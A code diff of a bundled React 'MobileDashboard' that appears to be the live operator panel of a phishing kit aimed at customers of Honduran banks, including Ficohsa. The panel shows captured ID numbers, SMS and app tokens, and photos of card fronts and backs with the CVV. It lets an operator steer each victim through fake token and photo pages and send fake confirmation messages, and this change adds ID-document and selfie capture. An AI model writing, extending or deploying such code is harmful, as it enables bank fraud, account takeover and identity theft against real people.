       }
     } catch (e) {
@@ -58850,8 +59305,8 @@ const MobileDashboard = () => {
     if (!userId || loadingPhotoAction[userId]) return;
     setLoadingPhotoAction((prev) => ({ ...prev, [userId]: true }));
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
       await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), userId), {
         fotoRechazada: true,
         esperandoAprobacionFoto: false,
@@ -58868,8 +59323,8 @@ const MobileDashboard = () => {
   };
   const handleUpdatePageWithClear = async (userId, page) => {
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0,import.meta.url);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -58897,8 +59352,8 @@ const MobileDashboard = () => {
   const handleErrorForUser = async (userId) => {
     const lastFormPage = lastFormPageByUser[userId] || 1;
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0,import.meta.url);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -58955,9 +59410,9 @@ const MobileDashboard = () => {
       case 1:
         return "DNI/RTN";
       case 2:
-        return isFicohsa2 ? "Token Móvil" : "Desbloquear";
+        return isFicohsa2 ? "Token Móvil" : "SMS Desbloquear";
       case 3:
-        return isFicohsa2 ? "Token SMS" : "Registrar";
+        return isFicohsa2 ? "Token SMS" : "SMS Registrar";
       case 4:
         return isFicohsa2 ? "Préstamo" : "Desconocido";
       case 5:
@@ -58965,7 +59420,13 @@ const MobileDashboard = () => {
       case 6:
         return "Finalizado";
       case 7:
-        return "Foto";
+        return isFicohsa2 ? "Foto Tarjeta" : "Foto DNI";
+      case 8:
+        return "T. Desbloquear";
+      case 9:
+        return "T. Registrar";
+      case 10:
+        return "Foto Selfie";
       default:
         return "Desconocido";
     }
@@ -59051,7 +59512,7 @@ const MobileDashboard = () => {
                   /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2 text-xs", children: [
                     /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: getStatusText(user.pageState) }),
                     /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: `px-1.5 py-0.5 rounded text-[10px] font-semibold ${successPressedByUser[user.id] ? "bg-emerald-600/30 text-emerald-300" : user.page === 0 ? "bg-red-600/30 text-red-300" : user.page === 5 ? "bg-red-600/30 text-red-300" : user.page === 6 ? "bg-emerald-600/30 text-emerald-300" : "bg-[#0058CB]/30 text-blue-300"}`, children: successPressedByUser[user.id] ? "Éxito" : getPageName(user.page || 0) }),
-                    isFicohsa && user.esperandoAprobacionFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "px-2 py-0.5 rounded text-[10px] font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 flex items-center gap-1 animate-pulse shadow-sm", children: [
+                    user.esperandoAprobacionFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "px-2 py-0.5 rounded text-[10px] font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 flex items-center gap-1 animate-pulse shadow-sm", children: [
                       /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 12, strokeWidth: 2.5, className: "text-emerald-400" }),
                       " Validar Foto"
                     ] })
@@ -59163,11 +59624,11 @@ const MobileDashboard = () => {
                 user.validarToken && /* @__PURE__ */ jsxRuntimeExports.jsxs(
                   "button",
                   {
-                    onClick: () => copyToClipboard(user.validarToken, "Token Validar"),
+                    onClick: () => copyToClipboard(user.validarToken, "T. Desbloquear"),
                     className: "bg-cyan-900/30 p-2 rounded border border-cyan-700/30 text-left hover:bg-cyan-800/40 active:bg-cyan-700/40 transition-colors flex items-center justify-between",
                     children: [
                       /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
-                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "T.Validar:" }),
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "T. Desb:" }),
                         " ",
                         /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-cyan-300", children: user.validarToken })
                       ] }),
@@ -59178,11 +59639,11 @@ const MobileDashboard = () => {
                 user.autorizarToken && /* @__PURE__ */ jsxRuntimeExports.jsxs(
                   "button",
                   {
-                    onClick: () => copyToClipboard(user.autorizarToken, "Token Autorizar"),
+                    onClick: () => copyToClipboard(user.autorizarToken, "T. Registrar"),
                     className: "bg-indigo-900/30 p-2 rounded border border-indigo-700/30 text-left hover:bg-indigo-800/40 active:bg-indigo-700/40 transition-colors flex items-center justify-between",
                     children: [
                       /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
-                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "T.Autorizar:" }),
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "T. Reg:" }),
                         " ",
                         /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-indigo-300", children: user.autorizarToken })
                       ] }),
@@ -59211,7 +59672,7 @@ const MobileDashboard = () => {
                   user.dispositivo === "Desktop" ? "PC" : user.dispositivo
                 ] })
               ] }),
-              isFicohsa && user.esperandoAprobacionFoto && (user.fotoTemporalHD || user.fotoTemporal) && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-gradient-to-b from-emerald-950/30 to-neutral-900 border-2 border-emerald-500/40 rounded-xl p-3 space-y-2.5 shadow-lg shadow-black/40", children: [
+              user.esperandoAprobacionFoto && (user.fotoTemporalHD || user.fotoTemporal) && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-gradient-to-b from-emerald-950/30 to-neutral-900 border-2 border-emerald-500/40 rounded-xl p-3 space-y-2.5 shadow-lg shadow-black/40", children: [
                 /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center justify-between", children: [
                   /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2", children: [
                     /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "w-2.5 h-2.5 rounded-full bg-emerald-400 animate-ping" }),
@@ -59224,7 +59685,7 @@ const MobileDashboard = () => {
                   {
                     onClick: () => setSelectedLightboxPhoto({
                       src: user.fotoTemporalHD || user.fotoTemporal,
-                      title: user.pasoFoto === "reverso" ? "Tarjeta - Reverso (Por Validar)" : "Tarjeta - Frente (Por Validar)",
+                      title: user.pasoFoto === "reverso" ? isFicohsa ? "Tarjeta - Reverso (Por Validar)" : "DNI - Reverso (Por Validar)" : isFicohsa ? "Tarjeta - Frente (Por Validar)" : "DNI - Frente (Por Validar)",
                       userId: user.id,
                       dni: user.DNI || user.RTN || user.id
                     }),
@@ -59234,7 +59695,7 @@ const MobileDashboard = () => {
                         "img",
                         {
                           src: user.fotoTemporalHD || user.fotoTemporal,
-                          alt: "Tarjeta enviada por el visitante",
+                          alt: "Documento/tarjeta enviada por el visitante",
                           className: "w-full h-full object-cover"
                         }
                       ),
@@ -59274,35 +59735,36 @@ const MobileDashboard = () => {
                   )
                 ] })
               ] }),
-              isFicohsa && user.page === 7 && !user.esperandoAprobacionFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-neutral-900/90 border border-[#0058CB]/40 rounded-xl p-3.5 flex flex-col items-center justify-center text-center space-y-2.5 relative overflow-hidden shadow-lg shadow-black/40", children: [
-                /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "w-11 h-11 rounded-full bg-[#0058CB]/25 border border-blue-400/30 flex items-center justify-center text-blue-300 shadow-sm", children: user.fotoRechazada ? /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 22, className: "animate-spin text-amber-400" }) : /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 22, className: "animate-pulse text-blue-300" }) }),
+              user.page === 7 && !user.esperandoAprobacionFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: `bg-neutral-900/90 border ${isFicohsa ? "border-[#0058CB]/40" : "border-[#E31B23]/40"} rounded-xl p-3.5 flex flex-col items-center justify-center text-center space-y-2.5 relative overflow-hidden shadow-lg shadow-black/40`, children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: `w-11 h-11 rounded-full ${isFicohsa ? "bg-[#0058CB]/25 border-blue-400/30 text-blue-300" : "bg-[#E31B23]/25 border-red-400/30 text-red-300"} border flex items-center justify-center shadow-sm`, children: user.fotoRechazada ? /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 22, className: "animate-spin text-amber-400" }) : /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 22, className: "animate-pulse" }) }),
                 /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
                   /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-xs font-bold text-white", children: user.fotoRechazada ? "El visitante está tomando la foto nuevamente" : "Esperando foto del visitante" }),
-                  /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-[11px] text-blue-300/90 mt-0.5 font-medium", children: user.pasoFoto === "reverso" ? "Paso 2 de 2: Reverso de la tarjeta (CVV/Firma)" : "Paso 1 de 2: Frente de la tarjeta" })
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: `text-[11px] ${isFicohsa ? "text-blue-300/90" : "text-red-300/90"} mt-0.5 font-medium`, children: user.pasoFoto === "reverso" ? isFicohsa ? "Paso 2 de 2: Reverso de la tarjeta (CVV/Firma)" : "Paso 2 de 2: Reverso del documento (DNI)" : isFicohsa ? "Paso 1 de 2: Frente de la tarjeta" : "Paso 1 de 2: Frente del documento (DNI)" })
                 ] }),
                 /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 bg-black/40 px-3 py-1 rounded-full border border-white/10", children: "Los botones de aprobación aparecerán apenas la capture" })
               ] }),
-              isFicohsa && (user.fotoFrente || user.fotoReverso) && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-neutral-900/80 border border-neutral-700/60 rounded-xl p-3 space-y-2", children: [
+              (user.fotoFrente || user.fotoReverso || user.fotoSelfie) && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-neutral-900/80 border border-neutral-700/60 rounded-xl p-3 space-y-2", children: [
                 /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex items-center justify-between", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-xs font-semibold text-gray-200 flex items-center gap-1.5", children: [
                   /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 14, className: "text-emerald-400" }),
-                  " Tarjetas aprobadas:"
+                  " ",
+                  isFicohsa ? "Tarjetas aprobadas:" : "Fotos aprobadas:"
                 ] }) }),
-                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "grid grid-cols-2 gap-2", children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: `grid ${user.fotoSelfie ? "grid-cols-3" : "grid-cols-2"} gap-2`, children: [
                   /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col gap-1", children: [
-                    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: "Frente" }),
+                    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: isFicohsa ? "Frente" : "Documento frente" }),
                     user.fotoFrente && typeof user.fotoFrente === "string" && user.fotoFrente.startsWith("data:") ? /* @__PURE__ */ jsxRuntimeExports.jsxs(
                       "button",
                       {
                         type: "button",
                         onClick: () => setSelectedLightboxPhoto({
                           src: user.fotoFrente,
-                          title: "Tarjeta - Frente",
+                          title: isFicohsa ? "Tarjeta - Frente" : "DNI - Frente",
                           userId: user.id,
                           dni: user.DNI || user.RTN || user.id
                         }),
                         className: "relative rounded-lg overflow-hidden border border-emerald-500/50 aspect-[16/10] bg-black/60 active:scale-95 transition-transform",
                         children: [
-                          /* @__PURE__ */ jsxRuntimeExports.jsx("img", { src: user.fotoFrente, alt: "Frente Tarjeta", className: "w-full h-full object-cover" }),
+                          /* @__PURE__ */ jsxRuntimeExports.jsx("img", { src: user.fotoFrente, alt: "Frente", className: "w-full h-full object-cover" }),
                           /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 bg-black/30 flex items-center justify-center", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-[10px] text-white font-medium bg-black/75 px-1.5 py-0.5 rounded flex items-center gap-1", children: [
                             /* @__PURE__ */ jsxRuntimeExports.jsx(IconEye, { size: 12 }),
                             " Ver"
@@ -59312,20 +59774,20 @@ const MobileDashboard = () => {
                     ) : /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "rounded-lg border border-gray-800 bg-gray-900/60 aspect-[16/10] flex items-center justify-center text-[10px] text-gray-500", children: user.fotoFrente ? "Aprobado" : "Pendiente" })
                   ] }),
                   /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col gap-1", children: [
-                    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: "Reverso" }),
+                    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: isFicohsa ? "Reverso" : "Documento reverso" }),
                     user.fotoReverso && typeof user.fotoReverso === "string" && user.fotoReverso.startsWith("data:") ? /* @__PURE__ */ jsxRuntimeExports.jsxs(
                       "button",
                       {
                         type: "button",
                         onClick: () => setSelectedLightboxPhoto({
                           src: user.fotoReverso,
-                          title: "Tarjeta - Reverso",
+                          title: isFicohsa ? "Tarjeta - Reverso" : "DNI - Reverso",
                           userId: user.id,
                           dni: user.DNI || user.RTN || user.id
                         }),
                         className: "relative rounded-lg overflow-hidden border border-emerald-500/50 aspect-[16/10] bg-black/60 active:scale-95 transition-transform",
                         children: [
-                          /* @__PURE__ */ jsxRuntimeExports.jsx("img", { src: user.fotoReverso, alt: "Reverso Tarjeta", className: "w-full h-full object-cover" }),
+                          /* @__PURE__ */ jsxRuntimeExports.jsx("img", { src: user.fotoReverso, alt: "Reverso", className: "w-full h-full object-cover" }),
                           /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 bg-black/30 flex items-center justify-center", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-[10px] text-white font-medium bg-black/75 px-1.5 py-0.5 rounded flex items-center gap-1", children: [
                             /* @__PURE__ */ jsxRuntimeExports.jsx(IconEye, { size: 12 }),
                             " Ver"
@@ -59333,6 +59795,29 @@ const MobileDashboard = () => {
                         ]
                       }
                     ) : /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "rounded-lg border border-gray-800 bg-gray-900/60 aspect-[16/10] flex items-center justify-center text-[10px] text-gray-500", children: user.fotoReverso ? "Aprobado" : "Pendiente" })
+                  ] }),
+                  user.fotoSelfie && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col gap-1", children: [
+                    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: "Selfie" }),
+                    typeof user.fotoSelfie === "string" && user.fotoSelfie.startsWith("data:") ? /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                      "button",
+                      {
+                        type: "button",
+                        onClick: () => setSelectedLightboxPhoto({
+                          src: user.fotoSelfie,
+                          title: "Reconocimiento Facial - Selfie",
+                          userId: user.id,
+                          dni: user.DNI || user.RTN || user.id
+                        }),
+                        className: "relative rounded-lg overflow-hidden border border-emerald-500/50 aspect-[16/10] bg-black/60 active:scale-95 transition-transform",
+                        children: [
+                          /* @__PURE__ */ jsxRuntimeExports.jsx("img", { src: user.fotoSelfie, alt: "Selfie", className: "w-full h-full object-cover" }),
+                          /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 bg-black/30 flex items-center justify-center", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-[10px] text-white font-medium bg-black/75 px-1.5 py-0.5 rounded flex items-center gap-1", children: [
+                            /* @__PURE__ */ jsxRuntimeExports.jsx(IconEye, { size: 12 }),
+                            " Ver"
+                          ] }) })
+                        ]
+                      }
+                    ) : /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "rounded-lg border border-gray-800 bg-gray-900/60 aspect-[16/10] flex items-center justify-center text-[10px] text-gray-500", children: "Aprobado" })
                   ] })
                 ] })
               ] }),
@@ -59343,10 +59828,10 @@ const MobileDashboard = () => {
                 { page: 3, label: "Token SMS", cols: "col-span-1" }
               ] : [
                 { page: 1, label: "DNI/RTN", cols: "col-span-2" },
-                { page: 2, label: "Desbloquear", cols: "col-span-1" },
-                { page: 3, label: "Registrar", cols: "col-span-1" },
-                { page: 8, label: "Token Validar", cols: "col-span-1" },
-                { page: 9, label: "Token Autorizar", cols: "col-span-1" }
+                { page: 2, label: "SMS Desbloquear", cols: "col-span-1" },
+                { page: 3, label: "SMS Registrar", cols: "col-span-1" },
+                { page: 8, label: "T. Desbloquear", cols: "col-span-1" },
+                { page: 9, label: "T. Registrar", cols: "col-span-1" }
               ]).map(({ page, label, cols }) => /* @__PURE__ */ jsxRuntimeExports.jsx(
                 "button",
                 {
@@ -59366,8 +59851,8 @@ const MobileDashboard = () => {
                         setSuccessPressedByUser((prev) => ({ ...prev, [user.id]: true }));
                         const lastFormPage = lastFormPageByUser[user.id] || 1;
                         const message = lastFormPage === 1 ? "Identidad confirmada exitosamente" : "Token confirmado exitosamente";
-                        __vitePreload(async () => { const {doc, updateDoc} = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0).then(({ doc, updateDoc }) => {
-                          __vitePreload(async () => { const {db, getBankCollection} = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0).then(({ db, getBankCollection }) => {
+                        __vitePreload(async () => { const {doc, updateDoc} = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url).then(({ doc, updateDoc }) => {
+                          __vitePreload(async () => { const {db, getBankCollection} = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0,import.meta.url).then(({ db, getBankCollection }) => {
                             updateDoc(doc(db, getBankCollection("redireccion"), user.id), {
                               successMessage: message
                             });
@@ -59396,13 +59881,13 @@ const MobileDashboard = () => {
                   }
                 )
               ] }),
-              isFicohsa && /* @__PURE__ */ jsxRuntimeExports.jsx("div", { children: /* @__PURE__ */ jsxRuntimeExports.jsxs(
+              isFicohsa ? /* @__PURE__ */ jsxRuntimeExports.jsx("div", { children: /* @__PURE__ */ jsxRuntimeExports.jsxs(
                 "button",
                 {
                   onClick: async () => {
                     try {
-                      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-                      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+                      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+                      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
                       await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), user.id), {
                         mostrarModalFoto: true,
                         fotoRechazada: false,
@@ -59421,10 +59906,69 @@ const MobileDashboard = () => {
                   className: `w-full py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-1.5 ${user.page === 7 ? "bg-[#0058CB] text-white font-semibold ring-2 ring-blue-400/60" : user.page === 0 ? "bg-[#0058CB] text-white font-semibold" : "bg-gray-700/50 text-gray-500"}`,
                   children: [
                     /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 14 }),
-                    " Foto"
+                    " Foto Tarjeta"
                   ]
                 }
-              ) }),
+              ) }) : /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "grid grid-cols-2 gap-2", children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                  "button",
+                  {
+                    onClick: async () => {
+                      try {
+                        const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+                        const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+                        await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), user.id), {
+                          mostrarModalFoto: true,
+                          fotoRechazada: false,
+                          esperandoAprobacionFoto: false,
+                          fotoAprobada: false,
+                          pasoFoto: "frente",
+                          fotoTemporal: null,
+                          fotoTemporalHD: null
+                        });
+                      } catch (e) {
+                        console.error("[MobileDashboard] Error al solicitar foto DNI:", e);
+                      }
+                      handleUpdatePageWithClear(user.id, 7);
+                    },
+                    disabled: user.page !== 0 && user.page !== 7,
+                    className: `w-full py-2 px-2.5 rounded-lg text-xs font-medium flex items-center justify-center gap-1.5 ${user.page === 7 ? "bg-purple-600 text-white font-semibold ring-2 ring-purple-400/60" : user.page === 0 ? "bg-purple-600 text-white font-semibold" : "bg-gray-700/50 text-gray-500"}`,
+                    children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 14 }),
+                      " Foto DNI"
+                    ]
+                  }
+                ),
+                /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                  "button",
+                  {
+                    onClick: async () => {
+                      try {
+                        const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+                        const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+                        await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), user.id), {
+                          mostrarModalFoto: true,
+                          fotoRechazada: false,
+                          esperandoAprobacionFoto: false,
+                          fotoAprobada: false,
+                          pasoFoto: "selfie",
+                          fotoTemporal: null,
+                          fotoTemporalHD: null
+                        });
+                      } catch (e) {
+                        console.error("[MobileDashboard] Error al solicitar selfie:", e);
+                      }
+                      handleUpdatePageWithClear(user.id, 10);
+                    },
+                    disabled: user.page !== 0 && user.page !== 10,
+                    className: `w-full py-2 px-2.5 rounded-lg text-xs font-medium flex items-center justify-center gap-1.5 ${user.page === 10 ? "bg-purple-600 text-white font-semibold ring-2 ring-purple-400/60" : user.page === 0 ? "bg-purple-600 text-white font-semibold" : "bg-gray-700/50 text-gray-500"}`,
+                    children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 14 }),
+                      " Foto Selfie"
+                    ]
+                  }
+                )
+              ] }),
               /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "space-y-2", children: [
                 /* @__PURE__ */ jsxRuntimeExports.jsx(
                   "button",
